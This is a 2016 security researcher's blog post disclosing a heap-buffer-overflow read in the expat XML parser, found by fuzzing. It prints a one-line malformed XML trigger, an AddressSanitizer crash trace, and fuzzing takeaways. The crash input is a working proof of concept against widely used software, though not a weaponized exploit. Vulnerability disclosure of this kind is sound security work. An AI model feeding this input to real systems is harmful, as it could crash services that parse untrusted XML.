---
layout: post
title:  "[CVE-2016-????] expat xml parser heap overflow vulnerability"
date:   2016-06-17 18:00:00 +0800
categories: security android chromium
---

## TL;DR: I found a XML bug that can fit into a Tweet!

Around one month ago I found a nice bug in the `expat` XML parser, which is very popular, it's for sure used in `Android` and `Google Chrome`, but also accordingly to [Wikipedia][expat-wikipedia] it's used also in Apache HTTP Server, Mozilla, Perl, Python and PHP. So it affects lot of software projects and lot of users.

I reported it to the Android team for disclosure but...

...today they notified me there was a bug collision, so I'm writing a blogpost to disclose it.

The coolest thing about this bug is that it can actually the trigger can fit into a tweet :D

If you make it printable it's more or less:

`<?x0?><!DOCTYPE c0 SYSTEM ""[<!----><!ENTITY R0 ""0`

Anyway let's get back to business...

## ASAN Crash

Here you can see the crash (outline is just a tool that takes from stdin the xml and output some informations using the expat library:

{% highlight text %}
➜  examples cat ~/Downloads/expat_minim | ./outline 
=================================================================
==3216== ERROR: AddressSanitizer: heap-buffer-overflow on address 0xf5403e81 at pc 0x8101080 bp 0xffe789e8 sp 0xffe789dc
READ of size 1 at 0xf5403e81 thread T0
    #0 0x810107f (/home/bob/VulnResearch/Android/expat-2.1.1/examples/outline+0x810107f)
    #1 0x8067664 (/home/bob/VulnResearch/Android/expat-2.1.1/examples/outline+0x8067664)
    #2 0x8096cb3 (/home/bob/VulnResearch/Android/expat-2.1.1/examples/outline+0x8096cb3)
    #3 0x80c13cf (/home/bob/VulnResearch/Android/expat-2.1.1/examples/outline+0x80c13cf)
    #4 0x80e6444 (/home/bob/VulnResearch/Android/expat-2.1.1/examples/outline+0x80e6444)
    #5 0x80490af (/home/bob/VulnResearch/Android/expat-2.1.1/examples/outline+0x80490af)
    #6 0xf5fcca82 (/lib/i386-linux-gnu/libc-2.19.so+0x19a82)
    #7 0x80494e5 (/home/bob/VulnResearch/Android/expat-2.1.1/examples/outline+0x80494e5)
0xf5403e81 is located 1 bytes to the right of 2048-byte region [0xf5403680,0xf5403e80)
allocated by thread T0 here:
    #0 0xf6177854 (/usr/lib32/libasan.so.0.0.0+0x16854)
    #1 0x80e7629 (/home/bob/VulnResearch/Android/expat-2.1.1/examples/outline+0x80e7629)
Shadow bytes around the buggy address:
  0x3ea80780: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x3ea80790: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x3ea807a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x3ea807b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x3ea807c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x3ea807d0:[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x3ea807e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x3ea807f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x3ea80800: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x3ea80810: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x3ea80820: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:     fa
  Heap righ redzone:     fb
  Freed Heap region:     fd
  Stack left redzone:    f1
  Stack mid redzone:     f2
  Stack right redzone:   f3
  Stack partial redzone: f4
  Stack after return:    f5
  Stack use after scope: f8
  Global redzone:        f9
  Global init order:     f6
  Poisoned by user:      f7
  ASan internal:         fe
==3216== ABORTING
{% endhighlight %}

And you can download the minimized test case [here](/assets/expat_minim)

#### Take aways:
- AddressSanitizer will greatly improve your fault detection capabilities while fuzzing
- Grammar and corpus are very important for fuzzing
- If done right you can find bugs by fuzzing even with a single cheap machine, against the fuzzing giants like Google.

[expat-wikipedia]: https://en.wikipedia.org/wiki/Expat_(library)
